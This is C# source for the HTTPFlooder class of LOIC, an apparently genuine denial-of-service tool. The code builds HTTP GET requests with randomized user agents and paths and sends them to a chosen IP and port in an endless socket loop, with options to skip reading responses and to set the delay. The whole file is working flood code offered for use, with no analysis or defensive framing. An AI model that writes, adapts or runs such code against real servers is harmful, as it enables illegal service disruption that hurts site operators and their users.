using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace LOIC
{
	public class HTTPFlooder
	{
		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
		public ReqState State = ReqState.Ready;
		public int Downloaded;
		public int Requested;
		public int Failed;
		public bool IsFlooding;
		public string Host;
		public string IP;
		public int Port;
		public string Subsite;
		public int Delay;
		public int Timeout;
		public bool Resp;
		private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
		private long LastAction;
		private bool AllowRandom;
		private bool AllowGzip;

		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool gzip)
		{
			this.Host = host;
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout;
			this.AllowRandom = random;
			this.AllowGzip = gzip;
		}
		public void Start()
		{
			IsFlooding = true; LastAction = Tick();

			tTimepoll = new System.Windows.Forms.Timer();
			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
			tTimepoll.Start();

			BackgroundWorker bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}
		void tTimepoll_Tick(object sender, EventArgs e)
		{
			if(Tick() > LastAction + Timeout)
			{
				Failed++; State = ReqState.Failed;
				tTimepoll.Stop();
				if(IsFlooding)
					tTimepoll.Start();
			}
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : null), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null), Environment.NewLine));
				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					LastAction = Tick();
					byte[] recvBuf = new byte[64];
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					State = ReqState.Connecting; // SET STATE TO CONNECTING //

					try { socket.Connect(RHost); }
					catch { continue; }

					socket.Blocking = Resp;
					State = ReqState.Requesting; // SET STATE TO REQUESTING //
					socket.Send(buf, SocketFlags.None);
					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++

					if(Resp)
						socket.Receive(recvBuf, 64, SocketFlags.None);

					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
					tTimepoll.Stop();
					tTimepoll.Start();

					if(Delay >= 0)
						System.Threading.Thread.Sleep(Delay+1);
				}
			}
			catch { }
			finally { IsFlooding = false; }
		}
		private static long Tick()
		{
			return DateTime.Now.Ticks / 10000;
		}
	}
}